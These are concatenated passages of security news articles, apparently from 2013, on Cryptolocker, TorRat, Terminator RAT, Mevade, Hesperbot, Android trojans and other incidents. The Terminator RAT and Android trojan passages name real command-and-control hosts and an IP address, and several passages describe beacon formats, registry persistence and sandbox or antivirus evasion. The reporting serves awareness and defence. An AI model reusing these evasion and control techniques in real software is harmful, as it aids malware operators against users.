bounty program, in my opinion is fundamental to incentive hackers to ethical disclosure of the bug. An attack against a social media could have serious repercussion on the users and on the reputation of the platform, if hackers sell the knowledge of the flaw on the black market a growing number of cyber criminals could benefit from it." }

Among home PC users, you may think that you protected from malicious software by Installing an effective, trusted antivirus solution, but most if the Antivirus solutions still it merely finds and removes any known threats. But what if someday you turn on your system and you will find a pop up window with a warning that says \"Your system is Locked and Important drives are encrypted and there is no way out unless you will not Pay fine\". This is what Ransomware malware does to your system. Ransomware is the most serious emerging threat in the virtual world of computing devices. Ransomware is a kind of malware which is designed to Block access to the computing system or can lock your system until an amount of money is paid through Internet banking. Ransomware is usually installed when you open a malicious attachment in an email message or when you click on a malicious link in an email message, instant message, a social networking site or other websites. A new piece of ransomware is giving Internet users one more reason to think twice before they click a link in an email. You may have read about the Cryptolocker malware in our previous stories on The Hacker News, a new ransomware Trojan that encrypts your files and demands money to return them. Cryptolocker has been infecting PCs around the world and effectively holding the files within for ransom. Cryptolocker first made an appearance last month. Malware Researcher 'Octavian Minea' from Bitdefender explains the detailed inner workings of the Cryptolocker Ransomware, lets have a look: The Cryptolocker ransomware gets installed with the help of Zbot variant (Zbot, is a malware toolkit that allows a cybercriminal to build his own Trojan Horse. Zeus, which is sold on the black market, allows non-programmers to purchase the technology they need to carry out cybercrimes.) and after installation it immediately adds itself to the Startup folder with a random name. Then it tries to establish connection with its command and control server on remote location using the Internet and send a 192 byte encrypted packet: \"version=1&id=1&name={COMPUTER_NAME}&group={GROUP_NAME}&lid={LOCATION_ID}\" Where {GROUP_NAME} seems to be related to the time of compilation of the malware and an example for {LOCATION_ID} is 'en-US'. On successful connection, the server generates a pair of 2048-bit RSA public and private key and the malware receives only the public key and a newly generated Bitcoin address. For each victim, only the Cryptolocker authors have access to the decryption private keys. The received information from the server gets stored in the system registry at: HKEY_CURRENT_USER\\Software\\Cryptolocker_NUMBER\\ Which contain the values PublicKey, Version Info with Bitcoin address and the command and control server address in an encrypted form. Cryptolocker uses a solid encryption scheme as well, which so far appears unbreakable. It begins encrypting documents on any local or network storage drive, which are in any of these formats: *.odt*.ods*.odp*.odm*.odc*.odb*.doc*.docx*.docm*.wps*.xls*.xlsx*.xlsm*.xlsb*.xlk*.ppt*.pptx*.pptm*.mdb*.accdb*.pst*.dwg*.dxf*.dxg*.wpd*.rtf*.wb2*.pdf*.mdf*.dbf*.psd*.pdd*.eps*.ai*.indd*.cdr????????.jpg????????.jpeimg_*.jpg*.dng*.3fr*.arw*.srf*.sr2*.bay*.crw*.cr2*.dcr*.kdc*.erf*.mef*.mrw*.nef*.nrw*.orf*.raf*.raw*.rwl*.rw2*.r3d*.ptx*.pef*.srw*.x3f*.der*.cer*.crt*.pem*.pfx*.p12*.p7b*.p7c An AES key is generated for each file to be encrypted, the file is then AES-encrypted and the AES key is itself encrypted using the public key. The encrypted AES key is then appended to the encrypted file. While the public key is stored on the computer, the private key is stored on the command-and-control server; CryptoLocker demands a payment with either a MoneyPak card or Bitcoin to recover the key and begin decrypting files, and threatens to delete the private key if a payment is not received within 3 days. \"Payment of the ransom can generally be performed in Bitcoins, although some Cryptolocker variants also accept payment methods Ukash, CashU or, only in the US of A, in Money Pack prepaid cards which can only be bought with cash. All these payment methods are practically anonymous.\" he said. Due to the extremely large key size it uses, analysts and those affected by the worm have considered CryptoLocker to be extremely difficult to repair. Users who have their files locked up by the ransomware are currently paying $300 to $700 to the criminals who run the virus to gain control of their computer. Once the victim pays the ransom, the transaction ID must be entered and purportedly verifications ensue. If a private key is sent by the server, it is added to the registry and the decryption process begins. So far, there have been no reports of the hackers reinfecting a machine once the ransom has been paid. However, the attackers give you roughly three days to pay them, otherwise your data is gone forever, especially if they do not perform regular and off-site backups. Today’s cybercriminals are using more sophisticated attacks, such as ransomware and spear phishing, which yield them more money per attack than ever before. A sample study of 1000 users by Symantec found India to be the ransomware capital of Asia Pacific with 11% victims of virtual extortion. There are several free ways to help protect your computer against ransomware and other malware: Make sure to keep all of the software on your computer up to date. Make sure that automatic updating is turned on to get all the latest security updates. Never open any attachment unless you know who it's from and why they are sending it. Use secure connections for sensitive transactions. Use strong alphanumeric and symbol passwords. Use virtual keyboard for internet banking. Common sense is another good weapon in the fight against viruses. Swati Khandelwal - Working at 'The Hacker News'. Social Media Lover and Gadgets Girl.

Besides our own Facebook Page, Twitter account, and Google+ profile, I also manage several others and, YES, I feel the “time management” pain! To make social media management and monitoring easier for users, some very innovative desktop applications and mobile apps were developed to help organize multiple platforms and information sharing across selected networks. Using online tools like TweetDeck, Seesmic, Hootsuite, Feedly, Twuffer and Buffer App for scheduling and posting directly from a web page has become an absolute necessity especially where Twitter is concerned. Additionally these apps gives you the ability to post on one or all of your connected accounts together i.e Multiple Facebook, Twitter or Google+ profiles. These applications don't require your passwords for social media accounts, i.e. It would be really very uncool in sharing your Facebook password with a third-party site. That's where OAuth comes in. OAuth is an open standard for authorization, which keeps your passwords safe on third-party sites and instead of giving the keys to your entire house, you've given a special key called 'Access token' that only opens one room which you want them to access. This Access token behaves similar to a session variable which you can store in a cookie to keep the user logged into your website. The only difference is that many services will send back an Access Token and Secret Access Token. You likely need both of these to pull any data from the server. But more importantly, if somehow that application server gets hacked, your Twitter or Facebook passwords are still safe. But yes, the hackers would still be able to post on your behalf on Facebook or Twitter and can spread spam via tweets, status updates or Direct Inbox messages. Rather than hacking into individual accounts which is almost impossible, Hacking an OAuth based application server, having millions of users - is enough to damage the Internet and Social Media. Just yesterday Buffer, the social content management and scheduling service was hacked by cyber crooks, which resulted in a flood of unauthorized posts to user accounts for both Twitter and Facebook. The security of such apps should be very high, where access to Social media accounts of millions of users are available in bulk after exploiting the vulnerabilities in application server only. Buffer Hack was basically used to spread SPAM messages linked to weight-loss web site. The main reason why this particular attack is so effective is because: The victims were essentially receiving messages including links from sources they trust; accounts that they follow on Twitter or Facebook. A hacker could trigger huge spam messages on all buffer users with one click. But in the worst scenarios, a malicious attacker could use the same techniques to spam links to Malware infected websites or other such websites serving exploit kits to compromise visitors' computers. After recovering for Security Breach, Buffer said on Sunday that they have encrypted all OAuth access tokens in the database for further security. In June 2012, a hacking group called 'LulzsecReborn' associated with Anonymous Hackers, hacked into TweetGif website, which allows you to use animated GIF image as your twitter picture. In that hack, attackers were able to access 10,000 Twitter users OAuth access tokens and they choose to leak the information on the Internet, including usernames, TweetGif account passwords, Real names, locations, Bios, Avatars and Secret tokens also on the Internet. To avoid such issues, pay attention to the permissions that each app is taken from your account. If it does something you don't want it to do, just don't use that app. There is no good or even half good way to protect keys that untrusted users can access. The minimum amount of effort won't be effective. Even the maximum amount of effort won't be effective against a skilled hacker with just a few hours of spare time. It is a genuine problem with no effective solution. Not in Java, not in C#, not in Perl, not in C, not in anything. Think of it as if it was a Law of Physics. Your alternatives are: Always use trusted applications and grant limited required permissions. Turn your application into a service and run it on a machine that you control access to. Use some authentication mechanism that doesn't require permanent secret keys to be distributed. Always, be sure to regularly review your authorized apps so you don't run into trouble if you haven't used one of them in a while, you're probably better off getting rid of it completely. All you need to do is go to your Twitter settings and revoke access to that app. That way, your tokens become useless and your account is under your control again, without even having to change your password.

Yesterday, Cybersecurity experts revealed that a major artery in Israel's national road network located in the northern the city of Haifa suffered a cyber attack, that caused massive traffic congestion in the City. Isreal military officials are aware of cyber threats that could hit the infrastructure of the country and they afraid the possible effect of a cyber attack on a large scale. Israeli government websites suffer thousands of cyberattacks each day according Ofir Ben Avi, head of the government's website division. The Israel Electric Corp. confirmed that its servers register about 6,000 unique computer attacks every second. In June, Prime Minister Benjamin Netanyahu stated that Iran militia, Hezbollah and Hamas have targeted in numerous occasions Israel's \"essential systems,\" including its water facilities, electric grid, trains and banks. \"Every sphere of civilian economic life, let's not even talk about our security, is a potential or actual cyber attack target,\" said Netanyahu. Israel's military chief Lt. Gen. Benny Gantz made a high-profile speech recently outlining that within the greatest threats his country might face in the future there is the computer sabotage as a top concern. A sophisticated cyber attack could be used to shut down a banking system of Israel, the national electric grids or a defense system, this is a nightmare for the Defense. Cybersecurity experts revealed to The Associated Press that a major artery in Israel's national road network located in the northern the city of Haifa suffered a cyber attack that has caused serious logistical problems and hundreds of thousands of dollars in damage. The tunnel is a strategic thoroughfare in the third largest city of the country, and as a demonstration of its importance in the city is exploring the possibility to use the structure as a public shelter in case of emergency. It seems that the attackers used a malware to hit the security camera apparatus in the Carmel Tunnel toll road in Sept. 8 and to gain its control. \"The attack caused an immediate 20-minute lockdown of the roadway. The next day, the expert said, it shut down the roadway again during morning rush hour. It remained shut for eight hours, causing massive congestion.\" The experts that have investigated on the incident exclude that the hypothesis of a state-sponsored attack because the malicious code used was not sophisticated enough to be the work of a hostile government, it is likely the involvement of a group of hacktivists. Carmelton company that oversees the toll road, blamed a \"communication glitch\" for the incident, while Oren David, a manager of security firm RSA's anti-fraud unit, said that although he didn't have information about the tunnel incident similar attacks could represent a serious menace for population. \"Most of these systems are automated, especially as far as security is concerned. They're automated and they're remotely controlled, either over the Internet or otherwise, so they're vulnerable to cyberattack,\" \"among the top-targeted countries.\" said David. In reality Iranian hackers and other hostile entities have penetrated successfully Israeli systems, Israel has controlled the attacks to track back the hackers, profile their methods of attack and to conduct a disinformation campaign making available false information. To improve security of critical infrastructure the Israeli civilian infrastructure, Israel's national electric company has recently launched a training program, jointly with cyber defense company CyberGym, to teach engineers and managers of critical plants to detect ongoing cyber attacks. The attack scenario revealed portends to an escalation of attacks by hostile entities, whether they are cyber criminals, hacktivits or state-sponsored hackers, it's crucial for the Israeli government to invest in improvement of cyber capabilities for its survival." }

But from August 2012, Bitcoin Mining feature was added and it became a powerful hacking tool that was commonly associated with attacks on Financial institutions. ab This year TorRat Malware targeted two out of three major Banks in the Netherlands and the criminals stole over Million Dollars from user' Banking Accounts. The Dutch police has arrested four men from Alkmaar, Haarlem, Woubrugge and Roden on last Monday, who are suspected of involvement in the large scale digital fraud and money laundering case using TorRat Malware. Using Spear Phishing techniques, gang targeted the victims to access their computers and the Financial accounts. The gang used anonymous VPN services, Bitcoins, TorMail and the Tor network itself to remain anonymous. Malware is also capable of manipulating the information during online banking, can secretly add new payment orders and also able to modify existing orders. To defend the detection from Antivirus softwares, TorRat uses the ZeuS malware in its attack. The technique was used to divert the focus of researchers to remove ZeuS infection, rather than the unknown malware on the system. Some of the stolen money was converted by criminals to (56 BTC worth around 7700 Euros) Bitcoin virtual currency, which are now seized by Dutch police. Police also mentioned that, one of arrested criminal having his own Bitcoin exchange service. The TorRAT malware has been known to be distributed in multiple ways. In April, TorRat was in news for hijacking twitter accounts. After infecting a vulnerable computers, the TorRAT malware hijacks the Twitter user’s account and share links that lead to attack websites that attempt to inject TorRAT malware into the victim’s computer. The main reason why this particular attack is so effective is because victims are essentially receiving links to the TorRAT malware from sources they trust; accounts that they follow on Twitter. TorRAT malware involves using Man-in-the-Browser (MitB) tactics to infect computers through vulnerabilities in their Web browser. These kinds of attacks were used to take over a victim’s online banking account. They made more than 150 fraudulent transactions for victim's accounts and Police said that, because Gang was operating from the Netherlands, so tracking them become possible." }

Advanced threats have targeted control systems in the past and these attacks use commercially available and custom-made advanced malware to steal information or perpetrate fraud. Terminator RAT has been used against Tibetan and Uyghur activists before and while tracking attack against entities in Taiwan, the Cyber Security company FireEye Labs recently analyzed some new samples of 'Terminator RAT' (Remote Access Tool) that was sent via spear-phishing emails to targets in Taiwan. A word document as an attachment was sent to victims, exploited a vulnerability in Microsoft Office (CVE-2012-0158), which subsequently drops a malware installer named “DW20.exe”. Sometimes the simplest techniques can foil the complex systems created by security firms and large enterprises to detect malicious programs and files. Lets see - What Evasion techniques this Advance version of Terminator RAT is using: This executable will first create its working folders located at “%UserProfile%\\Microsoft” and “%AppData%\\2019”, where it will store configurations and executable files (svchost_.exe and sss.exe). Malware terminates and remove itself after installation. The malware will only run after reboot. This is one effective way to evade sandbox automatic analysis, as malicious activity will only reveal after a reboot. The RAT (svchost_.exe) will collaborate with its relay (sss.exe) to communicate with the command and control server at liumingzhen.zapto.org / 123.51.208.69 and liumingzhen.myftp.org / 123.51.208.69. This component plays the role as a network relay between the malware and the proxy server, by listening over port 8000. This folder “2019” was then configured to be the new start up folder location by changing the registry “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startupdeter forensics investigation.” to deter forensics investigation by changing the startup location. Also to deter file-based scanning that implements a maximum file size filter, by expanding the size of svchost_.exe to 40MB. It is clear cybercrime is getting more organized and cybercriminals are becoming so much more sophisticated. Hackers are using stealth or advanced malware, usually to infiltrate hosts in networks and steal valuable data and APT attacks are increasingly becoming more sophisticated and harder to detect." }

That Malware is collecting location data and IP addresses of infected users and according to experts, malware is sending data back to its master servers based in North Korea. Just today the Korea's largest anti-virus software firm AhnLab confirmed that they have detected distributed denial-of-service (DDoS) attacks on local companies' websites. According to the report, about 16 websites of 13 companies, including Daum, MSN and the JoongAng Ilbo newspaper had been affected.

Update (1:42 PM Thursday, October 24, 2013 GMT): It seems that the issue has been resolved by admins and PHP.net is back as a normal clean website, after removing malicious scripts. Update: After Security Audit, PHP team found that two servers were compromised for some unknown time. They said that their Git repository was not compromised, and it remains in read only mode as services are brought back up in full. \"As it's possible that the attackers may have accessed the private key of the php.net SSL certificate, we have revoked it immediately. We are in the process of getting a new certificate, and expect to restore access to php.net sites that require SSL (including bugs.php.net and wiki.php.net) in the next few hours.\" blog post said. The team concludes that JavaScript malware was served to a small percentage of php.net users from the 22nd to the 24th of October 2013. Now all affected services have been migrated to new secure servers." }

The International Atomic Energy Agency (IAEA), which holds highly sensitive information and plays a key role in global efforts to prevent the spread of nuclear weapons, said on Tuesday that some of its computers were infected by malicious software, during the past several months. Malware can typically be used by cyber-attackers to gain remote access to systems, or to steal data, however spokesman Serge Gas said. \"No data from the IAEA network has been affected.\" The computers were located in common areas of the agency's Vienna headquarters, known as the Vienna International Centre (VIC). A third-party technician or visitor with the USB-drive infected with crimeware can be used to infect the system. \"The (IAEA) secretariat does not believe that the USB devices themselves were infected or that they could spread the malware further\" he said. Last November, the IAEA revealed that Iranian hackers had accessed one of its former computer servers and posted the contact details of some of the watchdog's experts online. \"Protecting information is vital to the IAEA's work. The agency continuously endeavours to achieve the highest possible level of protection of information,\" Gas said. The authority did not go into explicit details regarding the malware itself, but did stress that the use of removable media had to be reviewed and tightened." }

After almost two years of development, a few months back Mozilla officially launched their Firefox OS devices in stores and now the first Malware for the brand new platform is available. Shantanu Gawde, 17-years-old, an Independent Security Researcher is going to demonstrate the very first known malware for Firefox OS at the upcoming Information Security Summit - The Ground Zero (G0S) 2013, to be held on November 7th - 10th, 2013 at The Ashok, New Delhi. Firefox OS is different - Every app in Firefox OS including the Camera and the Dialer is a web app, i.e. a website in the form of an app. Simple! Mozilla has developed Web APIs so that HTML5 apps can communicate with the device’s hardware and Shantanu has used the same APIs intentionally to exploit the device for malicious purpose. Basically, there are two types of Firefox OS apps: packaged and hosted. Packed apps are essentially a zip file containing all of of an apps assets: HTML, CSS, JavaScript, images, manifest, etc. Hosted apps are just a website is the application, means you can host the app on a publicly accessible Web server, just like any other website. His demonstration will showcase the malware app developed by him using just HTML, CSS, and JavaScript, and capability to perform many malicious tasks remotely on the device i.e. Accessing SD Card Data, Stealing Contacts, downloading-uploading Files on device, Tracking Geological location of the user etc. \"The purpose of the PoC is of course to motivate developers to ensure better security on their platforms rather than providing inspiration to those with malicious intents.\" he told 'The Hacker News'. The rapid growth and evolution of mobile malware is swiftly becoming a highly profitable business for cybercriminals. According to the third annual Mobile Threats Report from Juniper Networks, mobile malware threats have grown a huge 614% in the period March 2012 to March 2013. With mobile malware on the rise and attackers becoming increasingly clever and they are also targeting every possible new platform. Make sure you will be at Ground Zero this year to see live threat to one of the prominent upcoming mobile operating systems. Update : A Mozilla spokesperson provided the following statement: \"We are aware of plans to demonstrate a malware app able to perform malicious tasks on the Firefox OS phone. Such attacks usually rely on developer mode functionality, which is common to most Smartphones but disabled by default. In addition, we believe this demonstration requires the phone to be physically connected to a computer controlled by the attacker, and unlocked by the user.\"" }

CryptoLocker, a new ransomware malware, began making the rounds several months ago. This ransomware is particularly nasty because infected users are in danger of losing their personal files forever. Ransomware is designed to extort money from computer users by holding computer files hostage until the computer user pays a ransom fee to get them back. The Cryptolocker hijacker sniffs out your personal files and wraps them with strong encryption before it demands money. Cryptolocker is spread through malicious hyperlinks shared via social media and spam emails, like fake UPS tracking notification emails. The original demanded payments of $100 to decrypt files, but the new and improved version demanding $300 from victims. Apparently, the encryption is created using a unique RSA-2048 public key. The decryption key is located on a secret server somewhere on the Internet and then there is a countdown on the infected machine which will let you know how long you have until this key will no longer be available. Ransomware is not a new threat, but in the last year, it has become more effective and more popular with criminals. Researchers from a number of antivirus vendors are working on a way to undo the damage, but it's not going to be easy. To prevent Ransomware from infecting your computer, please ensure that your computer has a properly configured firewall, updating each computer on a regular basis with the latest patches and updates from their vendor such as Microsoft, and restricting access solely to the administrator or person who operates the network or computer. Update: Another Screenshot of the latest variant CryptoLocker illustrates that Ransomware accepts payment in Bitcoins also. Once you send the payment of BTC2 (two Bitcoins, currently about $280), you will be shown a screen stating that your payment is being verified and the program will decrypt the files that it encrypted. However, CryptoLocker is the first widely-reported instances where a ransomware program will actually go as far as permanently encrypting files on a host computer. Unfortunately at this time there is no way to retrieve the private key that can be used to decrypt your files. This infection is typically spread through emails sent to company email addresses that pretend to be customer support related issues from Fedex, UPS, DHS, etc. These emails would contain a zip attachment that when opened would infect the computer. These zip files contain executable that are disguised as PDF files as they have a PDF icon and are typically named something like FORM_101513.exe or FORM_101513.pdf.exe. Since Microsoft does not show extensions by default, they look like normal PDF files and people open them. If you do not have System Restore enabled on your computer or reliable backups, then you will need to pay the ransom in order to get your files back." }

One of the reasons behind the increase in Mac related Malware attacks is the fact that Apple products are popular with many prominent businessmen and influential politicians. Daniel Pistelli, Reverse Engineer and lead developer of Cerbero Profiler, former developer of IDA Pro comes up with another interesting research, and explained The Hacker News, the basic details behind the technique he used to create an undetectable malware for Mac OS X. Apple implements internally an encryption mechanism to protect some of their own executable like \"Dock.app\" or \"Finder.app\". This encryption can be applied to malware as well. If one does, anti-malware solutions can no longer detect the malware because of the encryption, but OS X has no problem loading such malware. This same protection mechanism can be used on existing malwares that are already detected by Anti-malware products, to make them completely undetectable. Those same anti-malware products can no longer detect the malware because they don't understand it's encrypted. Currently, it’s true that there are fewer malware programs that are targeting Mac OS X versus Windows. However, that doesn’t mean that Macs are totally secure. To mitigate this problem Daniel suggests Anti-Malware product makers to either support the actual decryption , alternatively, to trust encrypted executables only when signed by Apple. Read complete technical details about the method on Daniel's Blog. The events of recent years have led many users to question just how secure Mac really is." }

In many organizations, it starts with monitoring your network for vulnerabilities that may enter the network to access potentially sensitive information in the form of security attacks. For example, you may have firewalls as your first line of defense, followed by vulnerability management, intrusion detection and prevention systems, managing your network configurations and so on. These are crucial because: Your routers can be easily breached without proper configuration and restrictions. If a firewall isn’t configured correctly, a hacker can easily spot a port that is accidentally left open and can gain access to the network. Rogue access points, botnet malware and social engineering can make your wireless a porthole into your LAN. Why Logs? The very purpose of IT security is to be proactive and the above measures make it more difficult for someone who attempts to compromise the network. This might just not be enough and you need to able to detect the actual breaches as they are being attempted. This is where log data really help. To expose an attack or identify the damage caused, you need to analyze the log events on your network in real-time. By collecting and analyzing logs, you can understand what transpires within your network. Each log file contains many pieces of information that can be invaluable, especially if you know how to read them and analyze them. With proper analysis of this actionable data you can identify intrusion attempts, mis-configured equipment, and many more. Also for managing compliance, especially for PCI DSS – you need to retain logs and review them. Monitoring and Analyzing Event Logs When you know what is normal on your network, you can easily spot what is abnormal by monitoring the logon activity. It is very critical to analyze the event to understand the root cause and to make log analysis & log management more efficient, you need to collect and consolidate log data across the IT environment, and correlate events from multiple devices in real-time. Apart from monitoring the activities across your web server, firewalls and other network devices, it becomes very crucial to monitor your workstation logs. For example, a workstation log can give you some key information like when a USB was connected, by whom and whether he belongs to the group that is authorized, etc. Log file analysis is best done with an SIEM software, when it comes to reading all of the events and being able to analyze and correlate activity across the various components of IT. How SolarWinds Log & Event Manager can help you? SolarWinds Log & Event Manager (LEM) completely monitor event logs across and acts as a central collection point for system log data, automatically aggregates and normalizes this data into a consistent format. LEM also performs multiple event correlation and has the distinct ability to set independent activity thresholds per event or per group to understand relationships between dramatically different activities. With its proactive approach, it helps you identify and respond to threats in real time. Key areas where SolarWinds LEM helps you: Monitoring Security Events: Event correlation allows you to effectively troubleshoot issues by understanding the relationship between various activities using multiple event correlations and alerts you as and when it encounters a security threat. Threat Remediation: Active responses help you in responding timely to policy violations and troubleshooting issues.

At first, No one knew who or what is responsible for this spontaneous growth of Tor users, but Security researchers at Fox-IT firm found evidence that the spike in Tor traffic is caused by a Mevade Botnet, that hides its Command-and-Control server in the anonymizing network. The security firm documented the presence of the Mevade malware architecture based on the anonymizing network, \"The malware uses a command and control connectivity via Tor .Onion links using HTTP. While some bots continue to operate using the standard HTTP connectivity, some versions of the malware use a peer-to-peer network to communicate (KAD based).\" \"Typically, it is fairly clear what the purpose of malware is, such as banking, click fraud, ransomware or fake anti-virus malware. In this case however it is a bit more difficult. It is possible that the purpose of this malware network is to load additional malware onto the system and that the infected systems are for sale. \" States the blog post. The benefit of using Tor network is to hide C&C servers, that allow criminals to build a bulletproof architecture. It was September, 2012 when the German security firm GData Software detected a Botnet with a particular feature, it was controlled from an Internet Relay Chat (IRC) server running as a hidden service of the Tor. The main advantages of Botnet based on Tor are: The botnet traffic is encrypted, which helps prevent detection by network monitors. By running as an Hidden Service, the origin, location, and nature of the C&C are concealed and therefore not exposed to possible takedowns. In addition, since Hidden Services do not rely on public-facing IP addresses, they can be hosted behind firewalls or NAT-enabled devices such as home computers. Hidden Services provides a Tor-specific .Onion pseudo top-level domain, which is not exposed to possible sinkholing. The operator can easily move around the C&C servers just by re-using the generated private key for the Hidden Service. Researches linked the bot agent to the Mevade malware family. \"A recent detection name that has been used in relation to this botnet is 'Mevade.A', but older references suggest the name 'Sefnit', which dates back to at least 2009 and also included Tor connectivity. We have found various references that the malware is internally known as SBC to its operators.\" Authors of Mevade Tor variant appear to use the Russian Language. One of them is known as “Scorpion” and with his colleague having nickname “Dekadent” probably are the part of an organized cyber gang. The monetization schema implemented by cybercriminals is not sure, probably their primary intent is install adware and toolbars on victim's systems. According TrendMicro Security expert the Mavade malware has also a \"backdoor component and communicates over SSH to remote hosts\" and the botnet could be used for data theft. It is possible that the purpose of this malware network is to load additional malware onto the system and that the infected systems are for sale. Members of the Tor Project have begun an investigation and explained in a blog post, “The fact is, with a growth curve like this one, there’s basically no way that there’s a new human behind each of these new Tor clients. These Tor clients got bundled into some new software which got installed onto millions of computers pretty much overnight. Since no large software or operating system vendors have come forward to tell us they just bundled Tor with all their users, that leaves me with one conclusion: somebody out there infected millions of computers and as part of their plan they installed Tor clients on them,” “It doesn’t look like the new clients are using the Tor network to send traffic to external destinations (like websites). Early indications are that they’re accessing hidden services — fast relays see “Received an ESTABLISH_RENDEZVOUS request” many times a second in their info-level logs, but fast exit relays don’t report a significant growth in exit traffic. One plausible explanation (assuming it is indeed a botnet) is that its running its Command and Control (C&C) point as a hidden service.” Tor users are advised to upgrade to the newest version of Tor to mitigate the effect of the Botnet, it in fact includes a new handshake feature which Tor relays prioritize over the older handshake. The upgrade will advantage legitimate new clients ever the ones who use the older version exploited by an actual variant of Mevade malware. Of course it is a palliative and not curative, the authors of the botnet may decide to update their Tor component too, that is the reason why Tor official also appealed security community to deeply analyze the botnet to shutdown it." }

Hesperbot detected as Win32/Spy.Hesperbot is very identical to the infamous Zeus and SpyEye Banking Malwares and infects users in Turkey, the Czech Republic, Portugal, and the United Kingdom. Trojan has functionalities such as keystroke logging, creation of screenshots and video capture, and setting up a remote proxy. The attackers aim to obtain login credentials giving them access to the victim’s bank account and getting them to install a mobile component of the malware on their Symbian, Blackberry or Android phone. Some other advanced tricks are also included in this banking Trojan, such as creating a hidden VNC server on the infected system and can do network traffic interception with HTML injection capabilities. So far, the Trojan hasn't spread too far. The campaign was first detected in the Czech Republic where the attackers had used phishing emails impersonating the country’s postal service. Armed with this information, the crooks can try to log into victims' online bank accounts to siphon off their cash. The trojan also harvests email addresses from the infected system and sends them to a remote server. It is possible that these collected addresses were also targeted by the malware-spreading campaigns. As for the UK, a special variant of the malware has been created, but ESET said it could not provide any further detail on it." }

The use of Java 6 still is prevalent, opening up a significant number of users to the threat. F-secure analyst Timo Hirvonen warned about the exploit over Twitter, advising that he had found an exploit in the wild actively targeting an unpatched vulnerability in Java 6, named CVE-2013-2463. The exploit's proof-of-concept was made public last week, prior to in-the-wild attacks surfacing on Monday. Oracle is aware of the hole but, since Java 6 is no longer supported, the company will not patch the issue. The vulnerability lies in Java Runtime Environment's 2D sub-component, which is used to make two-dimensional graphics. Because no patch is available, the exploits provides cybercriminals and other attackers an effective vehicle to launch attacks targeting users and organizations using Java 6. The Neutrino crimeware kit was first spotted in March 2013, when it was identified as the source of a series of attacks that were exploiting Java vulnerabilities to install ransomware on victims' PCs, freezing them until users paid a fine that was supposedly being levied by the FBI and other law enforcement agencies. The impact of this threat may be less for usual Internet users than for organizations/entities, who may not be quick to migrate to the latest software version due to business and/or operational continuity issues. Users should update their Java installations to the latest revision of version 7, which does not suffer from the issue. Users who don’t need Java in their everyday tasks should uninstall the software altogether." }

Ebrahim, who found a SQL Injection in \"Avira\" website last month, this time he found a Unvalidated Redirection Vulnerability that could be exploited for various purposes such as: Cloned websites (Phishing pages) It could also be used by Black Hats for Malware spreading In the specific case what is very striking is that the link usable for the attacks is originated by a security firm like Kaspersky with serious consequences. Would you trust a link from your security vendor? Absolutely Yes! But imagine your security vendor is asking you to download a malware! To explain how dangerous the situation is when your security vendor is vulnerable, Ebrahim Hegazy sent me a video explaining the malware spreading scenario to simulate a Black Hat's exploiting Unvalidated Redirection Vulnerability in Kaspersky website to serve a malware. \"Since I'm working on Cyber security analysis, I've seen many methods of black-hats to spread links, maybe this link is for Exploit kits, Java Applet, flash exploits, or maybe a direct link to their EXE file. Let's take an example on the Facebook spreading techniques of the attackers, you may notice that \"Mediafire\" website was used lately in wide Malware spreading attack on Facebook.com,Which caused a wide infection, as the infected user will start to send links from Mediafire.com to his friends and since \"Mediafire\" is a trusted website/source for users so they simply click it and download the file! But what if the links are coming from a very well known Security solutions vendor such as Kaspersky? For sure people will trust the links. So, through \"Unvalidated Redirection Vulnerability\" in Kaspersky, attackers will be able to spread a link coming from Kaspersky.com but when the user clicks on that link, he will get redirected to the attacker's website which would download at Malware on their machines or even download a \"Rogue Antivirus\" to steal financial information such as credit card information!\" explained Ebrahim Hegazy. After the researcher reported the vulnerability to Kaspersky team, it took about 2 months to fix the vulnerability, it is really a long time considering that if a hacker had found this flaw before Hagazy he could spread links using Kaspersky.com. The consequences of unfixing of such vulnerability are critical Wide infection - since the redirection is coming from a trusted source especially if the attacker registered a domain name similar to Kaspersky.com Very bad reputation for Kaspersky company. Your most trusted resource \"Your Antivirus\" will be your worst enemy! Would you trust anything else! And many other consequences. The vulnerability was reported to Kaspersky web-team and is now fixed." }

The GCM service allows Android app developers to send messages using JSON Format for installed apps, but hackers exploited it for malicious Purposes. Using Google Cloud Messaging Service (GCM) as Command and Control server for Android Malware is not a new concept, as last year Security researcher and Hacker 'Mohit Kumar' demonstrated 'Android Malware Engine' - One of the Most Sophisticated Android malware during Malcon conference. The Kaspersky Lab researchers have detected at least five Different Android Trojans that used JSON format:1. SMS.AndroidOS.FakeInst.a 2. SMS.AndroidOS.Agent.ao 3. SMS.AndroidOS.OpFake.a 4. Backdoor.AndroidOS.Maxit.a 5. SMS.AndroidOS.Agent.az. The authors of the malware in Every case took advantage of Google Cloud Messaging Service to Exchange messages between C&C services and the malicious app. Once Gained a Google Cloud Messaging Service (GCM) ID, malware updates are distributed exploiting directly the Google cloud services and also any Command to the malicious agent is sent is exploiting the service and using JSON format. Google Cloud Messaging Service (GCM) act as Command and Control server for the Trojans, which makes the malware updates as the official Updates via Google. “Furthermore, The execution of commands received from the Google Cloud Messaging Service GCM is performed by the GCM system and it is impossible to block them Directly on an infected device. The only way to cut this channel off From virus writers is to block developer accounts with IDs linked to the Registration of malicious programs.” SMS.AndroidOS.FakeInst.a Is the most diffused agent, according Kaspersky experts more than 4,800,000 installers have been detected and around 160000 attempted Installation was blocked in 2012. “It Can send text messages to premium numbers, delete incoming text Messages, generate shortcuts to malicious sites, and display Notifications advertising other malicious programs that are spread under The guise of useful applications or games” states the Kaspersky blog Post. SMS.AndroidOS.Agent.ao is presented as a porn app and has the primary intent to send messages to premium numbers, meanwhile the SMS.AndroidOS.OpFake.a malware is the typical SMS malicious application of which have been detected also more than 1 million installers. This last malware is also able to steal Sensitive information from the victim's handset such as contacts and it is also able to self-update its code, the agent appeared very active And was detected in 97 different countries, the majority in Russia and Eastern countries. The Kaspersky team has blocked more than 60,000 Attempted installs, it sends several commands from both the GCM and its Own C&C servers such as:Sending premium text messages to a specified number Sending text messages Performing self-updates Stealing text messages Deleting incoming text messages that meet the criteria set by the C&C Theft of contacts Replacing the C&C or GCM numbers Stopping or restarting its operations Backdoor.AndroidOS.Maxit trojan was very dated, first instance was detected in late 2011 and Appears to be continuously updated, today the experts counted more than 40 different variants most often in Malaysia, Thailand, the Philippines And Burma. “All of These modifications are very similar to one another,” “the app opens Websites with games, while malicious operations are executed in the Background.” It has been found most often in Malaysia, but also in Thailand, the Philippines and Burma. \"The The first thing the backdoor sets out to do is collect information about The phone and the SIM card, including the phone number and the mobile Provider. All of this data is uploaded to the androidproject.imaxter.net C&C. This is the server that manages all of the Trojan’s primaries Functions.\" The Last trojan, SMS.AndroidOS.Agent.az., was detected for the first time in May 2012 and is 